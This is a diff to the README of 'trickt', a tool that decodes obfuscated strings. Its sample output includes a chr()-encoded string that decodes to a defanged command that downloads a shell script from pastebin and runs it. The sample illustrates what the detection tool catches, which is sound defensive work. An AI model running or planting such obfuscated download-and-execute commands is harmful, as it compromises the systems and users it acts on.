@@ -4,7 +4,6 @@ Finds and converts obfuscated strings into a human readable form.
 ## Install
 
 ```bash
-# COMING SOON
 $ pip3 install trickt
 ```
 
@@ -142,7 +141,6 @@ line 7::original:>  b"my_hex = '\\x63\\x75\\x72\\x6C\\x20\\x68\\x78\\x78\\x70\\x
 line 9::original:>  b"oops, forgot my script here:  readpipe(chr(99) . chr(117) . chr(114) . chr(108) . chr(32) . chr(104) . chr(120) . chr(120) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(112) . chr(97) . chr(115) . chr(116) . chr(101) . chr(98) . chr(105) . chr(110) . chr(46) . chr(99) . chr(111) . chr(109) . chr(47) . chr(114) . chr(97) . chr(119) . chr(47) . chr(99) . chr(111) . chr(100) . chr(101) . chr(95) . chr(112) . chr(111) . chr(105) . chr(110) . chr(116) . chr(115) . chr(32) . chr(62) . chr(32) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104) . chr(32) . chr(38) . chr(38) . chr(32) . chr(46) . chr(47) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104)) which I hope you don't catch\n"
     |
     |--decoded_code_point>  b'curl hxxps://pastebin.com/raw/code_points > bad_file.sh && ./bad_file.sh'
-(venv) krayzpipes@pop-os:~/dev/repos/trickt$ 
 ```
 
 ## Use the API
